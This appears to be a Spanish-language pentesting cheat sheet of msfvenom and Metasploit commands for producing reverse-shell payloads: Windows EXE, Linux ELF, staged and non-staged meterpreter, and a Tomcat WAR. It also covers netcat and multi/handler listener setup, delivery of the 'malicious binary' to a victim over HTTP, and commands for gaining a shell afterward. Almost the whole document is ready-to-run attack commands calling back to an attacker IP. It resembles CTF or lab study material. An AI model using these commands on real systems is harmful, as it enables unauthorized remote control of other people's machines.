## Msfvenom ❮❯

Tags: #Msfvenom #Metasploit #ReverShell #Payloads #Netcat #Windows 

### Netcat
* Nos sirve para crear un binario malicioso, para después usar Metasploit y obtener la ReverShell para maquinas Windows 

* [MsfVenom-Payload](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

```bash
❯ msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST=172.0.0.1 LPORT=443 -f exe -o shell.exe 

	# p = Payload
	# f = Formato
	# o = Exportar como 
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
	# platform = Plataforma a usar
	# a = Arquitectura
```

Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un servidor HTTP y en la maquina victima lo podemos descargar desde el navegador colocando la IP del servicio compartido

* Nos ponemos en escucha por Netcat:
```bash 
❯ rlwrap nc -nlvp 443
```
* Ejecutamos el binario que subimos a Windows y ganamos acceso

### Linux Meterpreter

```python 
# Esto funciona cuando tenemos el usuario y passwd de un usuario normal

❯ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=172.0.0.1 LPORT=443 -f elf > hola.elf

	# p = Payload
	# f = Formato
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
```

### Payload Staged 
* Nos sirve para crear un binario malicioso, para después usar Metasploit y obtener la ReverShell para maquinas Windows 

```python
❯ msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=172.0.0.1 LPORT=443 -f exe -o reverse.exe 

	# p = Payload
	# f = Formato
	# o = Exportar como 
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
	# platform = Plataforma a usar
	# a = Arquitectura
```

Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un servidor HTTP
Ahora en Metasploit hacemos lo siguiente:

* Para verificar la DB del **Metasploit**
```python 
❯ msfdb run  # Actualiza la DB de Metasploit
```

* Dentro de Metasploit colocamos lo siguiente y así nos pondremos en escucha:
```Metasploit
❯ use exploit/multi/handler
❯ set payload windows/x64/meterpreter/reverse_tcp
❯ show options
❯ set LHOST 172.0.0.1
❯ set LPORT 443
❯ run
```

* Ejecutamos el binario que subimos a Windows

* Dentro de la maquina **Windows**
```bash
❯ getuid    # Nos muestra el usuario del servidor
❯ shell     # Obtenemos uns Shell en Metasploit para poder ejecutar comandos
```



### Payload Non-Staged
* Nos sirve para crear un binario malicioso, para después usar Metasploit y obtener la ReverShell para maquinas Windows 

```bash
❯ msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST=172.0.0.1 LPORT=443 -f exe -o reverse.exe 

	# p = Payload
	# f = Formato
	# o = Exportar como 
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port Atacante
	# platform = Plataforma a usar
	# a = Arquitectura
```
Teniendo ese binario malicioso lo debemos de pasar a la maquina victima con un servidor HTTP
Ahora en Metasploit hacemos lo siguiente:

* Para verificar la DB del **Metasploit**
```bash 
❯ msfdb run  # Actualiza la DB de Metasploit
```

* Dentro de metasploit colocamos lo siguiente y asi nos pondremos en escucha:
```Metasploit
❯ use exploit/multi/handler
❯ set payload windows/x64/meterpreter_reverse_tcp
❯ show options
❯ set LHOST 172.0.0.1
❯ set LPORT 443
❯ run
```

* Ejecutamos el binario que subimos a Windows

* Dentro de la maquina **Windows**
```bash
❯ getuid    # Nos muestra el usuario del servidor
❯ shell     # Obtenemos uns Shell en Metasploit para poder ejecutar comandos
```


## Tomcat 

```bash 
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o reverse.war

	# p = Payload
	# LHOST = Local Host (IP Atacante)
	# LPORT = Local Port 'Atacante'
	# f = Formato
	# o = Exportar como 
```